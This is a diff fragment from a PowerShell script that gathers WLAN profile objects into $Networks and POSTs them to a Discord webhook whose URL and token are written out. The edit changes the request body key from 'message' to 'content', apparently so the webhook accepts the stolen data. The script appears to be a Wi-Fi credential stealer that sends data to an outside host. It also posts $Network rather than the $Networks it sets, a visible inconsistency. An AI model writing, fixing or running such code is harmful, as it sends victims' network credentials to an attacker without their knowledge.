@@ -36,4 +36,4 @@ return $WLANProfileObjects
 
 $Networks = Get-Networks
 
-Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/1351248543071080529/mjRRTABsVHpDDuSoM1N0lpJNqR-iVawXHdemM7SKs7vfZGaneJTVtVbP0-iy7KYSSM7H' -Method POST -Body @{"message":"$Network"} -UseBasicParsing
+Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/1351248543071080529/mjRRTABsVHpDDuSoM1N0lpJNqR-iVawXHdemM7SKs7vfZGaneJTVtVbP0-iy7KYSSM7H' -Method POST -Body @{"content":"$Network"} -UseBasicParsing
